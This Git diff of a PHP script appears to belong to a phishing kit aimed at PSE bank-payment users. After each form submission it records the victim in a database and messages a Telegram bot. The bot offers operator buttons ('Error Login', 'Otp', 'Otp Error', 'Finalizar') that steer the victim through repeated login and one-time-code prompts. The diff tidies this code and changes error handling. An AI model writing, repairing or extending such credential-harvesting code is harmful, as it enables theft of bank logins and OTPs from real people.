@@ -27,21 +27,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     try {
         // --- SECCIÓN DE BASE DE DATOS CORREGIDA PARA PDO ---
         
-        // 1. PostgreSQL usa "RETURNING id" para devolver el ID
         $sql_insert = "INSERT INTO pse (estado) VALUES (?) RETURNING id";
-        
         $stmt_insert = $conn->prepare($sql_insert);
         $estado = 1; // Estado inicial
-        
-        // 2. En PDO, los valores se pasan en un array a execute()
-        //    Esto reemplaza a bind_param()
         $stmt_insert->execute([$estado]);
-        
-        // 3. En PDO, se usa fetchColumn() para obtener el ID devuelto
-        //    Esto reemplaza a insert_id
         $nuevo_id = $stmt_insert->fetchColumn(); 
-
-        // 4. No se usa close() en PDO de esta manera
         
         // --- FIN DE LA SECCIÓN CORREGIDA ---
 
@@ -59,16 +49,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         $keyboard = [
             'inline_keyboard' => [
-                [
-                    ['text' => 'Error Login', 'url' => "$baseUrl?id=$nuevo_id&estado=2&key=$security_key"]
-                ],
-                [
-                    ['text' => 'Otp', 'url' => "$baseUrl?id=$nuevo_id&estado=3&key=$security_key"],
-                    ['text' => 'Otp Error', 'url' => "$baseUrl?id=$nuevo_id&estado=4&key=$security_key"]
-                ],
-                [
-                    ['text' => 'Finalizar', 'url' => "$baseUrl?id=$nuevo_id&estado=0&key=$security_key"]
-                ]
+                [['text' => 'Error Login', 'url' => "$baseUrl?id=$nuevo_id&estado=2&key=$security_key"]],
+                [['text' => 'Otp', 'url' => "$baseUrl?id=$nuevo_id&estado=3&key=$security_key"],
+                 ['text' => 'Otp Error', 'url' => "$baseUrl?id=$nuevo_id&estado=4&key=$security_key"]],
+                [['text' => 'Finalizar', 'url' => "$baseUrl?id=$nuevo_id&estado=0&key=$security_key"]]
             ]
         ];
 
@@ -94,9 +78,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Verificamos si la respuesta de Telegram no fue un "200 OK"
         if ($result === FALSE || strpos($http_response_header[0], "200 OK") === false) {
-            // Error al enviar
+            
+            // !--- ESTE ES EL CAMBIO IMPORTANTE ---!
+            // En lugar de escribir en un archivo, mostramos el error en pantalla.
             $error_details = $result; // $result contiene el JSON de error de Telegram
-            file_put_contents('/tmp/telegram_debug_log.txt', "Error: " . print_r($error_details, true) . "\nDatos enviados: " . print_r($data, true), FILE_APPEND);            die('Error al enviar mensaje a Telegram');
+            die("ERROR DE TELEGRAM, LA API DIJO: " . $error_details);
+            
         }
 
         // Redirigir a la página cargando.php con el nuevo ID del cliente
@@ -106,7 +93,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     } catch (PDOException $e) {
         // Captura cualquier error de la base de datos (PDO)
         error_log("Error de BBDD: " . $e->getMessage());
-        die("Error al procesar la solicitud. Intente más tarde.");
+        die("Error al procesar la solicitud (Base de Datos): " . $e->getMessage());
     }
 }
 ?>
